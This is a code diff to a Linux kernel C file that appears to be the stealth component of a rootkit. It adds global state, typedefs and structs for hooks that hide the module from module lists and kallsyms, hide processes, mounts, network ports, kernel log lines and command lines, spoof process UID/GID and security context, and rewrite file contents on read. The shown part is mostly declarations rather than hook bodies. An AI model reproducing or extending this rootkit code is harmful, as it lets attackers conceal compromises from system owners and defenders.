@@ -1,9 +1,144 @@
 /* SPDX-License-Identifier: GPL-2.0 */
-/* neverc_krt_hide.c — implementations extracted from neverc_krt_hide.h. */
 #include <nvk.h>
 
+/* Cross-file hook state, accessed by neverc_krt_cleanup_all() in nvk.c */
+struct neverc_krt_hook _neverc_krt_ks_hook;
+int _neverc_krt_ks_hooked;
+struct neverc_krt_hook _neverc_krt_vmalloc_hook;
+int _neverc_krt_vmalloc_hooked;
+
+/* ---- internal typedefs ---- */
+
+typedef void (*neverc_krt_mutex_lock_fn)(void *);
+typedef void (*neverc_krt_mutex_unlock_fn)(void *);
+typedef void (*neverc_krt_kobject_del_fn)(void *kobj);
+typedef void (*neverc_krt_kobject_put_fn)(void *kobj);
+typedef int  (*neverc_krt_mod_seq_show_fn)(void *seq, void *v);
+typedef int  (*neverc_krt_mod_addr_fn)(unsigned long addr);
+typedef int  (*neverc_krt_proc_readdir_fn)(void *file, void *ctx);
+typedef int  (*neverc_krt_filldir_fn)(void *ctx, const char *name, int namlen,
+				      long long offset, u64 ino, unsigned int type);
+typedef int  (*neverc_krt_mounts_show_fn)(void *seq, void *v);
+typedef int  (*neverc_krt_vmalloc_show_fn)(void *seq, void *v);
+typedef long (*neverc_krt_kmsg_read_fn)(void *filp, char __user *buf,
+					size_t count, long long *ppos);
+typedef long (*neverc_krt_proc_status_show_fn)(void *seq, void *v);
+typedef int  (*neverc_krt_seq_printf_fn)(void *seq, const char *fmt, ...);
+typedef long (*neverc_krt_proc_attr_read_fn)(void *file, char __user *buf,
+					     size_t count, long long *ppos);
+typedef int  (*neverc_krt_net_seq_show_fn)(void *seq, void *v);
+typedef long (*neverc_krt_cmdline_read_fn)(void *file, char __user *buf,
+					   size_t count, long long *ppos);
+typedef long (*neverc_krt_vfs_read_fn)(void *file, char __user *buf,
+				       size_t count, long long *pos);
+
+/* ---- internal structs ---- */
+
+#define _NEVERC_KRT_PID_ACTOR_SLOTS 8
+
+struct _neverc_krt_pid_actor_slot {
+	volatile unsigned long task;
+	neverc_krt_filldir_fn orig;
+};
+
+struct neverc_krt_mount_filter {
+	char paths[NEVERC_KRT_MOUNT_FILTER_MAX][NEVERC_KRT_MOUNT_PATH_MAX];
+	int  count;
+	int  active;
+};
+
+struct _neverc_krt_vmap_area {
+	unsigned long va_start;
+	unsigned long va_end;
+};
+
+struct neverc_krt_net_hide_state {
+	u16 ports[NEVERC_KRT_NET_HIDE_PORT_MAX];
+	int count;
+	struct neverc_krt_hook tcp4_hook;
+	struct neverc_krt_hook tcp6_hook;
+	struct neverc_krt_hook udp4_hook;
+	struct neverc_krt_hook udp6_hook;
+	int active;
+};
+
+struct neverc_krt_file_spoof_entry {
+	char path[NEVERC_KRT_FILE_PATH_MAX];
+	char search[NEVERC_KRT_FILE_SPOOF_MAX_LEN];
+	char replace[NEVERC_KRT_FILE_SPOOF_MAX_LEN];
+	int  search_len;
+	int  replace_len;
+};
+
+/* ---- internal variables ---- */
+
+neverc_krt_mutex_lock_fn   _neverc_krt_hide_mutex_lock;
+neverc_krt_mutex_unlock_fn _neverc_krt_hide_mutex_unlock;
+void                      *_neverc_krt_module_mutex;
+neverc_krt_kobject_del_fn  _neverc_krt_kobject_del;
+neverc_krt_kobject_put_fn  _neverc_krt_kobject_put;
+int                        _neverc_krt_hide_inited;
+
+neverc_krt_mod_seq_show_fn _neverc_krt_orig_mod_seq_show;
+const char                *_neverc_krt_hide_target_name;
+
+neverc_krt_mod_addr_fn     _neverc_krt_orig_mod_text_addr;
+unsigned long              _neverc_krt_hide_mod_start;
+unsigned long              _neverc_krt_hide_mod_end;
+
+struct _neverc_krt_pid_actor_slot
+	_neverc_krt_pid_actors[_NEVERC_KRT_PID_ACTOR_SLOTS];
+
+struct neverc_krt_hook     _neverc_krt_mounts_hook;
+struct neverc_krt_mount_filter _neverc_krt_mnt_filter;
+neverc_krt_mounts_show_fn  _neverc_krt_orig_mounts_show_fn;
+
+neverc_krt_vmalloc_show_fn _neverc_krt_orig_vmalloc_show;
+unsigned long              _neverc_krt_vmalloc_hide_start;
+unsigned long              _neverc_krt_vmalloc_hide_end;
+
+struct neverc_krt_hook_ctx _neverc_krt_dmesg_ctx_hook;
+int                        _neverc_krt_dmesg_hooked;
+char _neverc_krt_dmesg_filters[NEVERC_KRT_DMESG_FILTER_MAX][NEVERC_KRT_DMESG_FILTER_LEN];
+int                        _neverc_krt_dmesg_filter_cnt;
+int                        _neverc_krt_dmesg_fmt_reg;
+
+struct neverc_krt_hook     _neverc_krt_kmsg_read_hook;
+neverc_krt_kmsg_read_fn    _neverc_krt_orig_kmsg_read;
+int                        _neverc_krt_kmsg_read_hooked;
+
+struct neverc_krt_hook     _neverc_krt_proc_status_hook;
+neverc_krt_proc_status_show_fn _neverc_krt_orig_proc_status;
+int                        _neverc_krt_proc_status_hooked;
 u32 _neverc_krt_status_spoof_uid = 0xFFFFFFFFU;
 u32 _neverc_krt_status_spoof_gid = 0xFFFFFFFFU;
+neverc_krt_seq_printf_fn   _neverc_krt_seq_printf_fn;
+
+struct neverc_krt_hook     _neverc_krt_proc_attr_hook;
+neverc_krt_proc_attr_read_fn _neverc_krt_orig_proc_attr_read;
+int                        _neverc_krt_proc_attr_hooked;
+const char                *_neverc_krt_attr_fake_ctx;
+
+struct neverc_krt_net_hide_state _neverc_krt_net_hide;
+neverc_krt_net_seq_show_fn _neverc_krt_orig_tcp4_show;
+neverc_krt_net_seq_show_fn _neverc_krt_orig_tcp6_show;
+neverc_krt_net_seq_show_fn _neverc_krt_orig_udp4_show;
+neverc_krt_net_seq_show_fn _neverc_krt_orig_udp6_show;
+
+struct neverc_krt_hook     _neverc_krt_cmdline_hook;
+neverc_krt_cmdline_read_fn _neverc_krt_orig_cmdline_read;
+int                        _neverc_krt_cmdline_hooked;
+char _neverc_krt_cmdline_filters[NEVERC_KRT_CMDLINE_FILTER_MAX][NEVERC_KRT_CMDLINE_FILTER_LEN];
+int                        _neverc_krt_cmdline_filter_cnt;
+
+struct neverc_krt_hook     _neverc_krt_vfs_read_hook;
+neverc_krt_vfs_read_fn     _neverc_krt_orig_vfs_read;
+int                        _neverc_krt_vfs_read_hooked;
+struct neverc_krt_file_spoof_entry _neverc_krt_file_spoofs[NEVERC_KRT_FILE_SPOOF_MAX];
+int                        _neverc_krt_file_spoof_cnt;
+int                        _neverc_krt_file_dentry_probed;
+
+#define _NEVERC_KRT_DENTRY_DNAME_NAME_OFF NEVERC_KRT_DENTRY_DNAME_OFF
 
 int neverc_krt_hide_init(void)
 {
@@ -248,8 +383,8 @@ void neverc_krt_mod_full_hide(struct neverc_krt_hide_state *state,
 	neverc_krt_mod_kallsyms_filter(state, module_name);
 }
 
-void _neverc_krt_hide_cleanup(struct neverc_krt_hide_state *state,
-			      struct neverc_krt_this_module *mod)
+static void _neverc_krt_hide_cleanup(struct neverc_krt_hide_state *state,
+				      struct neverc_krt_this_module *mod)
 {
 	if (state->kallsyms_filtered && _neverc_krt_ks_hooked) {
 		neverc_krt_hook_remove(&_neverc_krt_ks_hook);
